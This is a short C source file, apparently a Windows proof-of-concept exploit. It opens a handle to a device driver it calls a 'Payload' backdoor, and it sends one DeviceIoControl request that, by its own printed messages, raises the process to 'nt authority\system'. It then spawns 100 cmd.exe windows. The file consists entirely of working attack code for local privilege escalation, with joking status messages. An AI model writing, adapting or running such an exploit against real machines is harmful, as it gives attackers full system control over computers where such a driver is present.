#include "exploit.h"

int main(int argc, char** argv)
{
	char unused = 0, output[4096];
	HANDLE h_driver = (HANDLE)-1;
	unsigned long bytes_returned = 0;

	RtlSecureZeroMemory(&output, sizeof(output));

	system("title poc | color f");
	printf("[!] Lets rain some \"nt authority\\system\" shells!");

	h_driver = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the \"Payload\" backdoor device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the \"Payload\" backdoor device driver. Handle Value: 0x%p", h_driver);

	DeviceIoControl(h_driver, 0, 0, 16, &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Elevated our privileges to \"nt authority\\system.\"\n[!] One hundred elevated shells incoming...");

	Sleep(3000);
	for (int i = 0; i < 100; i++)
	{
		system("start cmd.exe");
	}
	printf("\n[+] Finished. Why did I write this?");
	unused = getchar();

	return 0;
}